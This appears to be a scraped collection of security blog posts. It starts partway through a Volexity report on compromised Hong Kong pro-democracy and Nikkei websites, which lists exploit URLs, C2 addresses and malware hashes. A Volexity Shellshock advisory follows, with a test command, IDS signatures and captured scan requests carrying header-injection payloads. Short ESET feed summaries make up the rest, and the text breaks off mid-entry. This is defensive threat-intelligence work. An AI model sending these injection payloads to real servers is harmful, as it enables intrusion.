<p>Diving further into some of the replies to this tweet is a plethora of information regarding the exploit domain java-se.com. In particular, a tweet from <a href=""https://twitter.com/9bplus"">Brandon Dixon</a> with <a href=""https://gist.github.com/9b/bef2907272cc770311c6"">relevant data</a> from the <a href=""http://passivetotal.org/"">PassiveTotal</a> project details several subdomains and IP addresses associated with java-se.com. While Volexity has only observed a handful of the hostnames in the wild thus far, other active subdomains suggest there could be additional on-going exploit or malware activity from the domain. Additional reporting on this activity and another going back to August 2014 was also recently shared on <a href=""http://threatconnect.com/"">ThreatConnect</a>. Despite all of this attention, the DPHK website is still compromised and references the JavaScript from the hostile domain.</p>
<p>It is also worth noting that this is not the first time that the DPHK website has been used in a strategic web compromise. Back in May 2011, Kaspersky Lab <a href=""https://securelist.com/blog/incidents/30644/democratic-party-of-hong-kong-website-compromised-and-serving-spyware/"">reported</a> the website was being leveraged to target users with Flash Exploits. The DPHK appears to be of high value with respect to targeting visitors.</p>
<h4><span style=""color: #003366;""><strong><span style=""text-decoration: underline;"">People Power &#8211; Hong Kong</span></strong></span></h4>
<p>During the course of investigating activity related to the ATD and DPHK websites, Volexity also observed that the website of the political coalition and pan-democratic organization People Power in Hong Kong (www.peoplepower.hk) had been compromised as well. However, unlike the other two websites, the People Power website did not contain JavaScript modifications pointing to java-se.com. Instead the website appears to have malicious iFrames leveraging the Chinese URL shortener <span style=""color: #3366ff;""><strong>985.so</strong></span>. At the bottom of several of the pages for the People Power website are four iFrames as seen in this screen shot of the website source:</p>
<p style=""padding-left: 30px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2014/10/people-power-iframe1.png""><img alt=""people-power-iframe"" class=""alignnone size-full wp-image-40"" height=""79"" src=""http://www.volexity.com/blog/wp-content/uploads/2014/10/people-power-iframe1.png"" width=""390"" /></a></p>
<p>Those links, with the exception of the first one, all redirect to exploit pages on the Hong Kong IP address <strong>58.64.178.77</strong>.</p>
<table border=""1"">
<tbody>
<tr>
<td><b>URL</b></td>
<td><b>Meta Refresh Page</b></td>
</tr>
<tr>
<td>hXXp://985.so/bUYj</td>
<td>N/A (HTTP 404)</td>
</tr>
<tr>
<td>hXXp://985.so/bUYe</td>
<td>hXXp://58.64.178.77:80/SiteLoader</td>
</tr>
<tr>
<td>hXXp://985.so/b6hW</td>
<td>hXXp://58.64.178.77/mPlayer</td>
</tr>
<tr>
<td>hXXp://985.so/bUYf</td>
<td>hXXp://58.64.178.77:80/0wnersh1p</td>
</tr>
</tbody>
</table>
<p>These pages load scripts that conduct profiling of the system for various software, plugins, and other related information, as well as load Java exploits designed to install malware on the target system. If successful, the exploits will install either a 32-bit or 64-bit version of the malware. Both files are found within the Java Archives files. Below are details on each of the malware files.</p>
<blockquote><p><strong>Filename:</strong> main.dll<br />
<strong>File size:</strong> 13824 bytes<br />
<strong>MD5 hash:</strong> 1befa2c2d1bfc8e87d52871c868f75fe<br />
<strong>SHA1 hash:</strong> 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817<br />
<strong>Notes: </strong> 32-bit version of malware, which beacons to 58.64.178.77:443.</p>
<p><strong>Filename:</strong> main64.dll<br />
<strong>File size:</strong> 15872 bytes<br />
<strong>MD5 hash:</strong> a482a84d13c76b950ce5bc7e75f4edef<br />
<strong>SHA1 hash:</strong> c0a4b9145e0066f5c1534beddc9c666ea8eb0882<br />
<strong>Notes: </strong> 64-bit version of malware, which beacons to 58.64.178.77:443.</p></blockquote>
<p>At the time of this writing, the People Power website is still serving up malicious code. Volexity recommends avoiding this website and/or browsing with caution. Volexity believes a separate group of attackers is responsible for this exploit activity and that they are not affiliated with the java-se.com operations.</p>
<h4><span style=""color: #003366;""><strong><span style=""text-decoration: underline;"">The Professional Commons &#8211; Hong Kong<br />
</span></strong></span></h4>
<p>While digging deeper into pro-democratic websites in Hong Kong, Volexity also discovered peculiar code on the website of a pro-democratic and pro-universal suffrage public policy think thank The Professional Commons (www.procommons.org.hk). In the case of this website, there is suspicious JavaScript code that writes an iFrame pointing back to a non-existent HTML page on a hotel website in South Korea. The code from the website can be seen in the screen shot below.</p>
<p style=""padding-left: 30px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2014/10/procommons-hotel-iframe.png""><img alt=""procommons-hotel-iframe"" class=""alignnone size-full wp-image-53"" height=""89"" src=""http://www.volexity.com/blog/wp-content/uploads/2014/10/procommons-hotel-iframe.png"" width=""826"" /></a></p>
<p>The URL in question points to:</p>
<blockquote>
<pre id=""line1"">hXXp://www.hotel365.co.kr/Lnk/tw/index.html</pre>
</blockquote>
<p>This link does not work and will redirect a visitor back to the main page of the website. There does not appear to be any reason for the Professional Commmons website to have a hidden iFrame link randomly placed in the middle of its HTML code. It is suspected that this was a formerly active exploit URL. If it is actually malicious, it is possible the code could be re-activated at any time. Volexity recommend the URL and the Professional Commons website be browsed with caution.</p>
<h2>High Profile Compromised Japanese Website</h2>
<h4><span style=""color: #003366;""><strong><span style=""text-decoration: underline;"">The Japanese Nikkei<br />
</span></strong></span></h4>
<p>In early September, the APT group behind java-se.com raised its visibility on Volexity&#8217;s radar following a compromise that effectively impacted many components of the Japanese Nikkei. In the first week of September, a subdomain used to load JavaScript code and additional files onto other Nikkei web properties such as <strong>www.nikkei.com</strong> and <strong>asia.nikkei.com</strong> was compromised. In particular a JavaScript file loaded from <strong>parts.nikkei.com</strong> was modified to reference another JavaScript file from <strong>jre76.java-se.com</strong> hosted on the Japanese IP address <strong>211.125.81.203</strong>.</p>
<blockquote><p>7506 | 211.125.80.0/22 | INTERQ | JP | GMO.JP | GMO INTERNET INC.</p></blockquote>
<p>The code has since been taken down. However, in early September the JavaScript was pre-pended to the file http://parts.nikkei.com/parts/SC/s_cDS.js as seen in the screen shot below.</p>
<p style=""padding-left: 30px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2014/10/parts-nikkei-src.png""><img alt=""parts-nikkei-src"" class=""alignnone size-full wp-image-56"" height=""215"" src=""http://www.volexity.com/blog/wp-content/uploads/2014/10/parts-nikkei-src.png"" width=""665"" /></a></p>
<p>Like the JavaScript from the ATD and DPHK websites, Volexity was never actually able to obtain a live copy of this script. Each request results in an HTTP 403 response from the server. Volexity suspects the code was either active at select times and/or was only served to a subset of visitors. The code has not been observed on the s_cDS.js file for nearly a month now.</p>
<h2>Live Exploits, Stolen Certificates, and Signed Malware</h2>
<p>While tracking this APT activity, Volexity has also come across other seemingly unrelated compromises of websites in Hong Kong and Japan associated with the java-se.com activity. Despite several sites being compromised, the above activity tied to java-se.com did not result in the successful capture of actual exploit code or malware. However, research into other websites and activity involving java-se.com did lead Volexity to live exploits and malware. In particular Volexity came across live exploit code hosted at  <strong>jdk-7u12-windows-i586.java-se.com</strong> on the Japanese IP address <strong>210.253.96.200</strong>.</p>
<blockquote><p>7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC.</p></blockquote>
<p>This system hosted a JavaScript file, which in turned loads a malicious Java Applet. In testing the the Java Applet pops up a notification to the user asking them if they want to run the applet. Volexity has not had enough time to thoroughly analyze the file to see if it is an actual exploit or if the attackers rely on user assisted malware installation. The pop-up does make it appear as if the file is an update to Java. The popup displayed by Java is displayed below.</p>
<p style=""padding-left: 60px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2014/10/jre-update-WindySoft.png""><img alt=""jre-update-WindySoft"" class=""alignnone size-full wp-image-57"" height=""314"" src=""http://www.volexity.com/blog/wp-content/uploads/2014/10/jre-update-WindySoft.png"" width=""547"" /></a></p>
<p>As can be seen in the image above, this popup could be misconstrued by a user as an update to Java despite the java-se.com domain and the Publisher being listed as<strong> WindySoft</strong>. Interestingly the Java Archive being loaded is digitally signed by a certificate issued to WindySoft, an online gaming company from South Korea. We cannot confirm this certificate actually belonged to WindySoft at any point in time, however, there is fairly established precedent of certificates from online gaming companies being used to digitally sign malware and attack tools.</p>
<p>&nbsp;</p>
<h3>PlugX Strikes Again &#8211; Digitally Signed &amp; Using 163.com Blogs</h3>
<p>As one might expect, choosing to press the Run button would be bad news for someone presented with this prompt. If one were to click Run from this prompt, it would result in the file <strong>css.jpg</strong> being download over an encrypted channel from a folder on <strong>https://elsa-jp.jp</strong>. Note that elsa-jp.jp is a website hosted on the same IP address jdk-7u12-windows-i586.java-se.com and is likely compromised. The file css.jpg is of course not a JPEG file, it is an executable that has been encoded with the single-byte XOR key 0xFF.</p>
<blockquote><p><strong>Filename:</strong> css.jpg<br />
<strong>File size:</strong> 168776 bytes<br />
<strong>MD5 hash:</strong> b3a9e6548fb3cc511096af4d68b2e745<br />
<strong>SHA1 hash:</strong> 394703d1240ccd3aaeeef50c212313e3036741b1<br />
<strong>Notes: </strong>Executable file downloaded by Java Applet that has been encoded with XOR 0x99</p></blockquote>
<p>Taking a closer look at the resulting executable we have, it turns out it is a newer sample of PlugX. In this particular sample an interesting and notable string was observed:</p>
<blockquote><p>C:\wocawocawoca\piao\Release\caca.pdb</p></blockquote>
<p>Also of interest is that as observed from the Java Applet, the executable is also digitally signed by a certificate issued to &#8220;WindySoft.&#8221;</p>
<p style=""padding-left: 60px;""> <a href=""http://www.volexity.com/blog/wp-content/uploads/2014/10/digitally-signed-plugx1.png""><img alt=""digitally-signed-plugx"" class=""alignnone size-full wp-image-64"" height=""411"" src=""http://www.volexity.com/blog/wp-content/uploads/2014/10/digitally-signed-plugx1.png"" width=""348"" /></a></p>
<p>&nbsp;</p>
<p>Upon execution the malware sample immediately does a DNS resolution for the following hostname:</p>
<p style=""padding-left: 30px;""><strong>jduhf873jdu7.blog.163.com</strong></p>
<p>The PlugX sample connects to the blog and parses the page for a command for where to connect to next. This is very similar to the method described by FireEye in their blog on <a href=""http://www.fireeye.com/blog/technical/targeted-attack/2014/08/operation-poisoned-hurricane.html"">Operation Poisoned Hurricane</a>. The primary difference being that the attackers opted to use a 163.com Blog over a Google Code page to embed the command. Taking a closer look at the Blog page the following post is observed:</p>
<p style=""padding-left: 30px;""><a href=""http://www.volexity.com/blog/wp-content/uploads/2014/10/plugx-jduh-blog1.png""><img alt=""plugx-jduh-blog"" class=""alignnone size-full wp-image-66"" height=""255"" src=""http://www.volexity.com/blog/wp-content/uploads/2014/10/plugx-jduh-blog1.png"" width=""541"" /></a></p>
<p>The primary string to focus on is in the title of the post: <strong>DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS</strong></p>
<p>Using the same decoding routine describe <a href=""http://blog.cassidiancybersecurity.com/post/2014/01/plugx-some-uncovered-points.html"">by Cassidian</a> in a PlugX post of theirs from earlier this year, we can see this command decodes to instruct the malware to connect to a U.S.-based Linode IP address at Hurricane Electric: <strong>173.255.217.77</strong>.</p>
<blockquote><p>6939 | 173.255.208.0/20 | HURRICANE | US | LINODE.COM | LINODE</p></blockquote>
<p>A look at passive DNS identifies several hostnames that recently resolved to the IP address. The ones that still resolve to the IP are listed below:</p>
<p style=""padding-left: 30px;""><strong>dns.apasms.com</strong><br />
<strong>ns.gpass1.org</strong><br />
<strong>ns1.gpass1.org</strong></p>
<p>These hostnames may be related but at the time of this writing we have not seen them in use in malware and are unable to confirm.</p>
<p>&nbsp;</p>
<h2>Conclusion</h2>
<p>As we have seen for several years now, dissenting groups, especially those seeking increased levels of freedom frequently find themselves targeted for surveillance and information extraction. In the digital age, a strategic web compromise (exploit drive-by) has become a key weapon of choice for to conduct such operations. These types of attacks are far from overt, as a typical target and victim opted to go on their own to what they believe should be a safe and trusted website. In the case of this post, it appears that at least two different attackers were involved in compromising and placing malicious code on Pro-Democratic websites in Hong Kong. This is not the first time and surely will not be the last time that those in favor of democracy in Hong Kong will be targeted. Unfortunately with the level of access and infrastructure the attackers appear to have, this is quite an uphill battle. Continuing to expose these attack is one means that shines light on these attack operations with an aim at putting a dent in their success.</p>",https://www.volexity.com/blog/2014/10/09/democracy-in-hong-kong-under-attack/
CVE-2014-6271 – Remotely Exploitable Vulnerability in Bash,"<p>With the excitement of public details of a remotely exploitable vulnerability in <strong>bash</strong> (<a href=""https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271"">CVE-2014-6271)</a> coming to light today, we decided it was as good of time as any to finally launch Volexity&#8217;s blog. We have a lot of exciting announcements and posts coming, but for now we turn our attention to bash. Today&#8217;s announcement and release of related patches may ultimately unleash something that rivals <a href=""http://heartbleed.com/"">HeartBleed</a>. While that still remains to be seen, the time for action from system administrators is <span style=""text-decoration: underline;"">now</span>.</p>
<h2>Are You Vulnerable?</h2>
<p>If you haven&#8217;t patched today, then the answer is most likely <span style=""text-decoration: underline;"">yes</span>. However, double checking if this is the case is rather simple. If you want to find out if your version of bash is  vulnerable to exploitation, you can use a script that Redhat <a href=""https://access.redhat.com/articles/1200223"">posted</a> earlier today and quickly check.</p>
<blockquote>
<pre>$ env x='() { :;}; echo vulnerable'  bash -c ""echo this is a test""
</pre>
</blockquote>
<p>A vulnerable version of bash will produce the following output:</p>
<blockquote>
<pre>vulnerable
this is a test</pre>
</blockquote>
<p>On the other hand, if your version of bash is patched or otherwise not affected, you will see this instead:</p>
<blockquote><p>bash: warning: x: ignoring function definition attempt<br />
bash: error importing function definition for `x&#8217;<br />
this is a test</p></blockquote>
<p>&nbsp;</p>
<p>Thanks to coordinated efforts, at the time all of this information became public, patches were already available for most major Linux distributions. Simply getting updates from your repositories and performing an update to your whole system or only bash should do the trick. The Redhat post also contains a few other mitigations, which may be helpful if you can&#8217;t patch your version of bash for some reason.</p>
<h2>Intrusion Detection</h2>
<p>As of Wednesday evening there isn&#8217;t mass panic or wide spread exploitation of this issue. However, this is something that can change in an instant, as security researchers, enthusiast, criminals and nation-states are surely working to determine how else this can be further exploited. At the moment most POCs and testing centers around exploitation via HTTP requests to CGI scripts. As a result, taking a look at incoming HTTP requests and your HTTP logs may be a good way to kept abreast of active threats to your network and devices.</p>
<p>Volexity has tested and deployed a few simple signatures for two of the most common scenarios we have seen both suggested and in POC exploit code. These are simple IDS signatures aimed at catching an artifact not commonly seen in HTTP header traffic (this includes User-Agent or any other real or made up HTTP header). This test signature has been deployed across several networks with 0 false positives thus far. This doesn&#8217;t mean the exploit can&#8217;t be leveraged without triggering our signature, but rather, we are not seeing common web crawlers or other browsers and devices that flag on the rules. The signature in both Suricata and Snort formats is seen below.</p>
<h3>Suricata Format</h3>
<blockquote><p>alert http $EXTERNAL_NET any -&gt; $HOME_NET any (msg:&#8221;Volex &#8211; Possible CVE-2014-6271 bash Vulnerability Requested (header)&#8221;; flow:established,to_server; content:&#8221;() {&#8220;; http_header;  threshold:type limit, track by_src, count 1, seconds 120; sid:2014092401;)</p></blockquote>
<h3>Snort Format</h3>
<blockquote><p>alert tcp $EXTERNAL_NET any -&gt; $HOME_NET $HTTP_PORTS (msg:&#8221;Volex &#8211; Possible CVE-2014-6271 bash Vulnerability Requested (header) &#8220;; flow:established,to_server; content:&#8221;() {&#8220;; http_header;  threshold:type limit, track by_src, count 1, seconds 120; sid:2014092401;)</p></blockquote>
<p>&nbsp;</p>
<p>If you think the rule looks extremely simplistic, you are 100% correct. We like to keep rules as simple as possible when getting them out in an emergency/immediate release. You will note the rule simply looks for &#8220;<strong>() {</strong>&#8221; in the HTTP header. These are what we have seen in tests and POCs thus far and hence the quick, dirty, and easy rule. Yes, there may ultimately be ways to evade this but it should be sufficient for now. With that said we have a working version that leverages pcre and will pick up several different variations that will evade the above two signatures. However, it is not quite ready for release, but if someone posts one before we release ours we will update this blog to include it. We recommend shipping it over to <a href=""http://emergingthreats.net/"">Emerging Threats </a>for public inclusion.</p>
<p>Feel free to <a href=""http://volexity.com/contact.html"">drop us a line</a> if you have any feedback or questions.</p>
<p>&nbsp;</p>
<h2>Internet Scans</h2>
<p>Update: 2014-09-24 21:10 ET</p>
<p>The first hits we have seen against our monitoring networks have come in and appear to be wide ranging scans from Errata Security from the IP address <strong>209.126.230.72</strong>. The inbound requests look like the one below.</p>
<blockquote><p>GET / HTTP/1.0<br />
User-Agent: shellshock-scan (http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html)<br />
Accept: */*<br />
Cookie: () { :; }; ping -c 17 209.126.230.74<br />
Host:() { :; }; ping -c 23 209.126.230.74<br />
Referer: () { :; }; ping -c 11 209.126.230.74</p></blockquote>
<p>Check your network for outbound ICMP connections to 209.126.230.74. This is probably a good indicator you have a vulnerable server. More details of their scanning efforts are available right at the blog seen in the User-Agent string (<a href=""http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.htm"">http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.htm</a>). Taking a look now it also seems they have some information on early results of the scanning effort as well.</p>
<p>Update 2014-09-25 02:34 ET</p>
<p>A new wave of scanning is making its way around looking to try this attack against cPanel&#8217;s /cgi-sys/defaultwebpage.cgi file. Scans in these instance have come from the IP address <strong>89.207.135.125</strong>. Sample HTTP request seen below:</p>
<blockquote><p>GET /cgi-sys/defaultwebpage.cgi HTTP/1.0<br />
User-Agent: () { :;}; /bin/ping -c 1 198.101.206.138<br />
Accept: */*</p></blockquote>
<p>This will attempt to send a single ping to the Rackspace IP address <strong>198.101.206.138</strong>.</p>",https://www.volexity.com/blog/2014/09/24/cve-2014-6271-remotely-exploitable-vulnerability-in-bash/
Apple underwhelmed by latest CIA exploits revealed by WikiLeaks,"<p>WikiLeaks's revelations about security vulnerabilities in Apple products appear to be a damp squib.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/24/apple-underwhelmed-latest-cia-exploits-revealed-wikileaks/"" rel=""nofollow"">Apple underwhelmed by latest CIA exploits revealed by WikiLeaks</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/iaqdQb5w8dw"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/iaqdQb5w8dw/
16 years of Mac OS X: Secure but not invincible to malware,"<p>Mac OS X is still secure 16 years after its creation, but increasingly being targeted by cybercriminals. No operating system is 100% malware-proof.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/24/16-years-mac-os-x-secure-not-invincible-malware/"" rel=""nofollow"">16 years of Mac OS X: Secure but not invincible to malware</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/pTB5cX1ftjI"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/pTB5cX1ftjI/
GDPR: A simple explainer,"<p>The GDPR is the biggest change in data protection laws for 20 years, and comes into effect on May 25th, 2018. We answer some key questions.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/24/gdpr-an-explainer/"" rel=""nofollow"">GDPR: A simple explainer</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/SpQN4lCVbq0"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/SpQN4lCVbq0/
When bad bugs bite: Apple iCloud accounts ‘held hostage’,"<p>The so-called Turkish Crime Family is demanding that Apple pays it a ransom, otherwise it will delete millions of credentials it says it possesses.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/24/bad-bugs-bite-apple-icloud-accounts-held-hostage/"" rel=""nofollow"">When bad bugs bite: Apple iCloud accounts &#8216;held hostage&#8217;</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/yfUjUCDhVQ0"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/yfUjUCDhVQ0/
"If you download Minecraft mods from Google Play, read on …","<p>ESET researchers have discovered 87 malicious apps on Google Play disguised as mods for Minecraft.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/23/download-minecraft-mods-google-play-read/"" rel=""nofollow"">If you download Minecraft mods from Google Play, read on …</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/X-qhaTwnj9Y"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/X-qhaTwnj9Y/
Google: More websites falling victim to cybercriminals,"<p>Google says that the number of websites compromised by cybercriminals has risen by 32%.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/23/google-websites-falling-victim-cybercriminals/"" rel=""nofollow"">Google: More websites falling victim to cybercriminals</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/rKyHUL31j3s"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/rKyHUL31j3s/
The economics of cybersecurity for the undecided,"<p>How do you calculate the value at risk? Choosing between investing in antivirus software or doing nothing to prevent cybercrime is not black and white. We explore the grey areas of cybersecurity economics.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/22/economics-cybersecurity-undecided/"" rel=""nofollow"">The economics of cybersecurity for the undecided</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/6nzxiBPrc8Y"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/6nzxiBPrc8Y/
ABTA experiences data breach,"<p>The Association of British Travel Agents discovered the data breach on March 1st, but failed to notify customers until March 16th.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/20/abta-experiences-data-breach/"" rel=""nofollow"">ABTA experiences data breach</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/OfW4xZwzwAg"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/OfW4xZwzwAg/
Flashback Friday: Operation Windigo,"<p>In 2014, ESET delivered a comprehensive and detailed report on Operation Windigo. We take a look back at what was documented and what insight was gathered.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/17/flashback-friday-operation-windigo/"" rel=""nofollow"">Flashback Friday: Operation Windigo</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/b0nBdvksaqA"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/b0nBdvksaqA/
Number of women in infosec industry ‘remains stagnant’,"<p>The number of women working within the infosec industry is “continues to remain low”, and could be exacerbating the skills gap within the industry.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/17/number-women-infosec-industry-remains-stagnant/"" rel=""nofollow"">Number of women in infosec industry ‘remains stagnant’</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/BrqzzsF0WHM"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/BrqzzsF0WHM/
US charges Russian FSB officials in connection with massive Yahoo security breach,"<p>The United States has charged four men, including two officials of Russia's FSB intelligence agency, in connection with a hacking attack against Yahoo that saw the details of 500 million users stolen and the use of forged cookies to break into accounts.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/16/us-charges-russian-fsb-officials-connection-massive-yahoo-security-breach/"" rel=""nofollow"">US charges Russian FSB officials in connection with massive Yahoo security breach</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/cqZe-SNjnFA"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/cqZe-SNjnFA/
Significant cyberthreat to UK businesses continues to grow,"<p>Greater collaboration is needed in order to combat the significant threat of cybercrime to British businesses, according to the UK’s National Crime Agency and the National Cyber Security Centre.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/14/significant-cyberthreat-uk-businesses-continues-grow/"" rel=""nofollow"">Significant cyberthreat to UK businesses continues to grow</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/omatzKncmvs"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/omatzKncmvs/
Challenges and implications of cybersecurity legislation,"<p> Cybersecurity legislation: organization, collaboration and diffusion across the globe, and working towards the populization of cybersecurity culture </p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/13/challenges-implications-cybersecurity-legislation/"" rel=""nofollow"">Challenges and implications of cybersecurity legislation</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/725HVAVNFFA"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/725HVAVNFFA/
Home Depot agrees to $25 million settlement for data breach,"<p>US retail giant Home Depot is set to pay a $25 million settlement in relation to a data breach suffered in 2014.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/10/home-depot-agrees-25-million-settlement-data-breach/"" rel=""nofollow"">Home Depot agrees to $25 million settlement for data breach</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/VwUG2MwT4oc"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/VwUG2MwT4oc/
Mobile security: The reality of malware … augmented,"<p>What awaits us in terms of mobile security trends? Throughout this article, we will discuss how risks might develop in the near future.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/10/mobile-security-the-reality-of-malware-augmented/"" rel=""nofollow"">Mobile security: The reality of malware … augmented</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/FI94EBhOrtY"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/FI94EBhOrtY/
Consumer Reports launches new privacy and data security standard,"<p>The US-based nonprofit organization Consumer Reports has come up with a new standard that aims to boost consumer confidence in privacy and data security.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/09/consumer-reports-launches-new-privacy-data-security-standard/"" rel=""nofollow"">Consumer Reports launches new privacy and data security standard</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/h8qrK-FEMkc"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/h8qrK-FEMkc/
New Instagram credential stealers discovered on Google Play,"<p>ESET researchers discovered 13 new Instagram credential stealers on Google play and looked into the motivations behind their fraudulent schemes.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/09/new-instagram-credentials-stealers-discovered-google-play/"" rel=""nofollow"">New Instagram credential stealers discovered on Google Play</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/qMDrnChbLuY"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/qMDrnChbLuY/
Ways in which to plug the infosec talent gap,"<p>ESET's Lysa Myers looks at the shortage of qualified information security talent to fill positions, discussing ways in which to plug the infosec talent gap.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/09/ways-plug-infosec-talent-gap/"" rel=""nofollow"">Ways in which to plug the infosec talent gap</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/YpewuVLzCO8"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/YpewuVLzCO8/
Aggressive ad-displaying Google Play app tricks users into leaving high ratings,"<p>ESET researchers have observed an increased number of apps on Google Play using social engineering techniques to boost their ratings, ranging from legitimate apps, through adware to malware.</p>
<p>The post <a href=""http://www.welivesecurity.com/2017/03/08/aggressive-ad-displaying-google-play-app-tricks-users-leaving-high-ratings/"" rel=""nofollow"">Aggressive ad-displaying Google Play app tricks users into leaving high ratings</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/jPte2VHAnCs"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/jPte2VHAnCs/
Good Weather App radio interview with Alexis Dorais-Joncas and Marc Saltzman,"<p>A full radio interview with ESET's Alexis Dorais-Joncas and radio and TV personality Marc Saltzman – on NewsTalk 1010 – talking about a malicious weather app that was found on Google Play.</p>
<p>The post <a href=""http://www.welivesecurity.com/podcasts/good-weather-app-radio-interview-with-alexis-dorais-joncas-and-marc-saltzman/"" rel=""nofollow"">Good Weather App radio interview with Alexis Dorais-Joncas and Marc Saltzman</a> appeared first on <a href=""http://feeds.feedburner.com/"" rel=""nofollow"">WeLiveSecurity</a></p><img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/eset/blog/~4/0TsjixRwy8U"" width=""1"" />",http://feedproxy.google.com/~r/eset/blog/~3/0TsjixRwy8U/
WordPress webmasters urged to upgrade to version 4.73 to patch six security holes,"<p>Another day, another important security update for WordPress. If you're running a self-hosted version of WordPress, you must update the software on your website now.</p>
